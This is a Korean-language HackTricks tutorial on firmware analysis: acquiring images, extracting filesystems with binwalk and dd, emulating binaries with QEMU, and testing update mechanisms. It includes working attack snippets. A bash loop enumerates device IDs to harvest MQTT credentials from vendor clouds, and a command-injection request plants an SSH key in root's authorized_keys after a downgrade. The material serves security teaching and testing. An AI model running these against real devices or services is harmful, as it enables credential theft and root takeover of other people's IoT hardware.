# 펌웨어 분석

{{#include ../../banners/hacktricks-training.md}}

## **소개**

### 관련 리소스


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}


펌웨어는 하드웨어 구성요소와 사용자가 상호작용하는 소프트웨어 사이의 통신을 관리하고 원활하게 하여 장치가 올바르게 동작하도록 하는 필수 소프트웨어입니다. 펌웨어는 영구 메모리에 저장되어 장치가 전원이 켜지는 순간부터 필수 명령에 접근할 수 있게 하며, 이는 운영체제의 부팅으로 이어집니다. 펌웨어를 검사하고 필요 시 수정하는 것은 보안 취약점을 식별하는 데 중요한 단계입니다.

## **정보 수집**

**정보 수집**은 장치 구성과 사용된 기술을 이해하는 데 있어 중요한 초기 단계입니다. 이 과정에서는 다음 항목들에 대한 데이터를 수집합니다:

- CPU 아키텍처와 실행되는 운영체제
- bootloader 세부사항
- 하드웨어 레이아웃 및 데이터시트
- 코드베이스 메트릭과 소스 위치
- 외부 라이브러리와 라이선스 유형
- 업데이트 이력과 규제 인증
- 아키텍처 및 흐름도
- 보안 평가와 확인된 취약점

이를 위해 **open-source intelligence (OSINT)** 도구는 매우 유용하며, 사용 가능한 오픈소스 소프트웨어 구성요소에 대한 수동 및 자동화된 검토 과정도 중요합니다. [Coverity Scan](https://scan.coverity.com)과 [Semmle’s LGTM](https://lgtm.com/#explore) 같은 도구는 무료 정적 분석을 제공하여 잠재적인 문제를 찾는 데 활용할 수 있습니다.

## **펌웨어 획득**

펌웨어를 획득하는 방법에는 난이도에 따라 여러 접근 방식이 있습니다:

- **직접** (개발자, 제조업체로부터)
- **제공된 지침을 통해 빌드**
- **공식 지원 사이트에서 다운로드**
- 호스팅된 펌웨어 파일을 찾기 위한 **Google dork** 쿼리 활용
- [S3Scanner](https://github.com/sa7mon/S3Scanner)와 같은 도구로 **클라우드 스토리지**에 직접 접근
- **업데이트**를 man-in-the-middle 기법으로 가로채기
- **UART**, **JTAG**, 또는 **PICit** 같은 연결을 통해 장치에서 추출
- 장치 통신 내에서 업데이트 요청을 **스니핑**
- 하드코딩된 업데이트 엔드포인트 식별 및 사용
- bootloader 또는 네트워크에서 **덤프**
- 모든 방법이 실패할 경우 적절한 하드웨어 도구를 사용해 저장 칩을 **분리 후 판독**

## 펌웨어 분석

이제 **펌웨어를 확보한 상태**이므로, 어떻게 다룰지 판단하기 위해 펌웨어에서 정보를 추출해야 합니다. 이를 위해 사용할 수 있는 다양한 도구들이 있습니다:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
If you don't find much with those tools check the **entropy** of the image with `binwalk -E <bin>`, if low entropy, then it's not likely to be encrypted. If high entropy, Its likely encrypted (or compressed in some way).

Moreover, you can use these tools to extract **펌웨어 내부에 포함된 파일들**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/))로 파일을 검사할 수 있습니다.

### 파일 시스템 얻기

앞서 언급한 `binwalk -ev <bin>` 같은 도구들로 **파일 시스템을 추출**할 수 있었을 것입니다.\
Binwalk는 보통 이를 **파일시스템 타입 이름으로 된 폴더** 안에 추출하는데, 보통 다음 중 하나입니다: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 수동 파일시스템 추출

때때로, binwalk는 시그니처에 파일시스템의 매직 바이트를 **포함하지 않을 수 있습니다**. 이런 경우에는 binwalk를 사용해 바이너리에서 파일시스템의 오프셋을 **찾고 압축된 파일시스템을 카빙(carve)** 한 뒤, 아래 단계에 따라 파일시스템의 타입에 맞게 **수동으로 추출**하세요.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
다음 **dd command**를 실행하여 Squashfs filesystem을 carving하세요.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
대안으로, 다음 명령어를 실행할 수도 있습니다.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- For squashfs (used in the example above)

`$ unsquashfs dir.squashfs`

Files will be in "`squashfs-root`" directory afterwards.

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- For jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- For ubifs filesystems with NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 펌웨어 분석

firmware를 입수한 후에는 그 구조와 잠재적 취약점을 이해하기 위해 반드시 분해해야 합니다. 이 과정에서는 다양한 도구를 활용해 firmware 이미지에서 유용한 데이터를 분석하고 추출합니다.

### 초기 분석 도구

초기 검사용으로 바이너리 파일(이하 `<bin>`)을 확인하기 위한 명령어 집합이 제공됩니다. 이 명령어들은 파일 타입 식별, 문자열 추출, 바이너리 데이터 분석, 파티션 및 파일시스템 세부 정보 파악에 도움을 줍니다:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
이미지의 암호화 상태를 평가하기 위해, **엔트로피**를 `binwalk -E <bin>`로 확인한다. 낮은 엔트로피는 암호화가 없음을 시사하고, 높은 엔트로피는 암호화 또는 압축 가능성을 나타낸다.

임베디드 파일을 추출하기 위해서는 **file-data-carving-recovery-tools** 문서와 파일 검사용 **binvis.io** 같은 도구와 리소스를 권장한다.

### 파일시스템 추출

일반적으로 `binwalk -ev <bin>`를 사용하면 파일시스템을 추출할 수 있으며, 보통 파일시스템 타입 이름(e.g., squashfs, ubifs)으로 된 디렉터리로 추출된다. 그러나 **binwalk**가 magic bytes 누락으로 파일시스템 타입을 인식하지 못할 경우 수동 추출이 필요하다. 이 과정은 `binwalk`로 파일시스템의 오프셋을 찾은 다음 `dd` 명령으로 파일시스템을 carve하는 것을 포함한다:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
그 후, 파일 시스템 유형(예: squashfs, cpio, jffs2, ubifs)에 따라 내용을 수동으로 추출하기 위한 명령어가 달라집니다.

### Filesystem Analysis

파일 시스템을 추출한 후 보안 결함 탐색이 시작됩니다. 불안전한 네트워크 데몬, 하드코딩된 자격증명, API 엔드포인트, 업데이트 서버 기능, 미컴파일 코드, 시작 스크립트, 오프라인 분석을 위한 컴파일된 바이너리에 주목합니다.

**주요 위치** 및 **항목** 검사 대상에는 다음이 포함됩니다:

- **etc/shadow** 및 **etc/passwd** — 사용자 자격증명 확인용
- **etc/ssl**의 SSL 인증서 및 키
- 잠재적 취약점이 있는 구성 및 스크립트 파일
- 추가 분석을 위한 임베디드 바이너리
- 일반적인 IoT 장치의 웹 서버 및 바이너리

파일 시스템 내 민감한 정보와 취약점을 발견하는 데 도움을 주는 여러 도구:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 및 [**Firmwalker**](https://github.com/craigz28/firmwalker) — 민감 정보 검색용
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) — 종합적인 펌웨어 분석용
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), 및 [**EMBA**](https://github.com/e-m-b-a/emba) — 정적 및 동적 분석용

### Security Checks on Compiled Binaries

파일 시스템에서 발견된 소스 코드와 컴파일된 바이너리 모두 취약점 검토 대상입니다. Unix 바이너리에는 **checksec.sh**, Windows 바이너리에는 **PESecurity** 같은 도구를 사용해 악용될 수 있는 보호되지 않은 바이너리를 식별합니다.

## Harvesting cloud config and MQTT credentials via derived URL tokens

많은 IoT 허브는 장치별 구성을 다음과 같은 클라우드 엔드포인트에서 가져옵니다:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

펌웨어 분석 중 <token>이 하드코딩된 비밀로 device ID에서 로컬로 유도된다는 것을 발견할 수 있습니다. 예를 들면:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

이 설계는 deviceId와 STATIC_KEY를 알아내는 누구나 URL을 재구성하여 클라우드 구성을 가져올 수 있게 하며, 종종 평문 MQTT 자격증명과 토픽 접두사를 드러냅니다.

Practical workflow:

1) UART 부팅 로그에서 deviceId 추출

- 3.3V UART 어댑터 (TX/RX/GND)를 연결하고 로그를 캡처:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- 클라우드 구성 URL 패턴과 브로커 주소를 출력하는 라인을 찾아보세요. 예:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) 펌웨어에서 STATIC_KEY와 token 알고리즘 복구

- 바이너리를 Ghidra/radare2에 로드하고 설정 경로 ("/pf/") 또는 MD5 사용을 검색합니다.
- 알고리즘을 확인합니다 (예: MD5(deviceId||STATIC_KEY)).
- Bash에서 token을 도출하고 digest를 대문자로 변환:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) 클라우드 구성 및 MQTT 자격 증명 수집

- URL을 구성하고 curl로 JSON을 가져온 후 jq로 파싱해 secrets를 추출합니다:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) plaintext MQTT 및 약한 topic ACLs 악용 (존재하는 경우)

- 복구된 자격 증명으로 maintenance topics를 구독하고 민감한 이벤트를 찾아보세요:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 예측 가능한 디바이스 ID 열거 (대규모로, 권한을 가진 상태에서)

- 많은 생태계는 벤더 OUI/제품/타입 바이트를 포함하고 그 뒤에 연속적인 접미사가 붙습니다.
- 후보 ID를 순회하면서 토큰을 유도하고 구성(configs)을 프로그래밍적으로 가져올 수 있습니다:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
노트
- Always obtain explicit authorization before attempting mass enumeration.
- Prefer emulation or static analysis to recover secrets without modifying target hardware when possible.

emulating firmware 과정은 디바이스의 동작이나 개별 프로그램에 대한 **dynamic analysis**를 가능하게 합니다. 이 접근법은 하드웨어나 아키텍처 종속성으로 인해 어려움을 겪을 수 있지만, root filesystem이나 특정 바이너리를 아키텍처와 엔디안이 일치하는 장치(예: Raspberry Pi)나 사전 구축된 가상 머신(pre-built virtual machine)으로 옮기면 추가 테스트를 용이하게 할 수 있습니다.

### Emulating Individual Binaries

단일 프로그램을 검사할 때는 프로그램의 endianness와 CPU architecture를 식별하는 것이 중요합니다.

#### Example with MIPS Architecture

MIPS architecture 바이너리를 emulate하려면 다음 명령을 사용할 수 있습니다:
```bash
file ./squashfs-root/bin/busybox
```
그리고 필요한 에뮬레이션 도구를 설치하려면:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian)의 경우 `qemu-mips`가 사용되며, 리틀 엔디안 바이너리에는 `qemu-mipsel`이 선택됩니다.

#### ARM Architecture Emulation

ARM 바이너리의 경우 과정은 유사하며 에뮬레이션에는 `qemu-arm` 이 사용됩니다.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 등과 같은 도구들은 전체 펌웨어 에뮬레이션을 자동화하여 동적 분석을 돕습니다.

## Dynamic Analysis in Practice

이 단계에서는 실제 기기 환경이나 에뮬레이트된 장치 환경을 사용해 분석을 진행합니다. OS와 파일시스템에 대한 셸 접근을 유지하는 것이 필수적입니다. 에뮬레이션은 하드웨어 상호작용을 완벽하게 모방하지 못할 수 있으므로 가끔 에뮬레이션을 재시작해야 할 수도 있습니다. 분석 시 파일시스템을 재검토하고, 노출된 웹페이지와 네트워크 서비스를 공격해 보며 부트로더 취약점을 탐색해야 합니다. 펌웨어 무결성 검사는 잠재적 백도어 취약점을 식별하는 데 중요합니다.

## Runtime Analysis Techniques

런타임 분석은 프로세스나 바이너리를 그 실행 환경에서 상호작용하며 분석하는 것으로, 브레이크포인트 설정과 퍼징 등으로 취약점을 식별하기 위해 gdb-multiarch, Frida, Ghidra 같은 도구를 사용합니다.

## Binary Exploitation and Proof-of-Concept

식별된 취약점에 대한 PoC를 개발하려면 대상 아키텍처에 대한 깊은 이해와 저수준 언어로의 프로그래밍 능력이 필요합니다. 임베디드 시스템에서는 바이너리 런타임 보호가 드물지만, 존재할 경우 Return Oriented Programming (ROP) 같은 기법이 필요할 수 있습니다.

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos)와 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 같은 운영체제는 필요한 도구가 갖춰진 사전 구성된 환경을 제공하여 펌웨어 보안 테스트를 쉽게 수행할 수 있도록 합니다.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS는 IoT 기기의 보안 평가와 penetration testing을 돕기 위해 설계된 배포판입니다. 필요한 도구들이 모두 로드된 사전 구성된 환경을 제공해 많은 시간을 절약해 줍니다.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 기반의 임베디드 보안 테스트 운영체제로, 펌웨어 보안 테스트 도구들이 사전 로드되어 있습니다.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

벤더가 펌웨어 이미지에 대해 암호화 서명 검증을 구현하더라도, **버전 롤백(다운그레이드) 보호는 자주 누락됩니다**. 부트로더나 리커버리 로더가 임베디드된 공개 키로 서명만 검증하고 플래시되는 이미지의 *버전*(또는 단조 증가 카운터)을 비교하지 않는다면, 공격자는 합법적으로 유효한 서명을 가진 **구버전의 취약한 펌웨어를 설치**하여 패치된 취약점을 다시 도입할 수 있습니다.

일반적인 공격 흐름:

1. **오래된 서명된 이미지 획득**
* 벤더의 공개 다운로드 포털, CDN 또는 지원 사이트에서 확보합니다.
* 동반 모바일/데스크탑 애플리케이션에서 추출합니다(예: Android APK 내부의 `assets/firmware/` 경로).
* VirusTotal, 인터넷 아카이브, 포럼 등 서드파티 저장소에서 검색합니다.
2. **이미지를 장치에 업로드하거나 제공** — 노출된 업데이트 채널을 통해:
* Web UI, mobile-app API, USB, TFTP, MQTT 등.
* 많은 소비자용 IoT 장치는 Base64로 인코딩된 펌웨어 블롭을 수신해 서버 측에서 디코딩하고 리커버리/업그레이드를 트리거하는 *인증되지 않은* HTTP(S) 엔드포인트를 노출합니다.
3. 다운그레이드 후, 최신 릴리스에서 패치된 취약점(예: 이후에 추가된 커맨드 인젝션 필터)을 악용합니다.
4. 선택적으로 지속성을 확보한 후 탐지를 피하기 위해 최신 이미지를 다시 플래시하거나 업데이트를 비활성화합니다.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
취약한(다운그레이드된) 펌웨어에서 `md5` 파라미터는 입력 검증 없이 쉘 명령어에 직접 연결되어 임의의 명령어를 주입할 수 있게 한다(여기서는 SSH 키 기반 root 접근을 가능하게 함). 이후 펌웨어 버전에서는 기본적인 문자 필터를 도입했지만, 다운그레이드 보호가 없어 이 수정은 무의미하다.

### 모바일 앱에서 펌웨어 추출하기

많은 벤더는 동반 모바일 앱에 전체 펌웨어 이미지를 번들로 포함시켜 앱이 Bluetooth/Wi-Fi를 통해 기기를 업데이트할 수 있게 한다. 이러한 패키지는 흔히 APK/APEX의 `assets/fw/` 또는 `res/raw/` 같은 경로에 암호화되지 않은 상태로 저장된다. `apktool`, `ghidra`, 또는 단순한 `unzip` 같은 도구를 사용하면 물리적 하드웨어를 건드리지 않고도 서명된 이미지를 추출할 수 있다.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### 업데이트 로직 평가 체크리스트

* *update endpoint*의 전송/인증이 적절히 보호되고 있는가 (TLS + authentication)?
* 장치는 플래싱 전에 **version numbers** 또는 **monotonic anti-rollback counter**를 비교하는가?
* 이미지가 secure boot chain 내부에서 검증되는가 (예: signatures가 ROM code에 의해 확인되는가)?
* userland code가 추가적인 sanity checks를 수행하는가 (예: allowed partition map, model number)?
* *partial* 또는 *backup* 업데이트 플로우가 동일한 validation logic를 재사용하는가?

> 💡  위 항목 중 하나라도 누락되어 있다면, 플랫폼은 아마 rollback attacks에 취약할 것이다.

## 연습용 취약한 firmware

firmware에서 취약점을 발견하는 연습을 위해, 다음의 vulnerable firmware 프로젝트들을 시작점으로 사용하라.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 참고자료

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## 교육 및 자격증

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
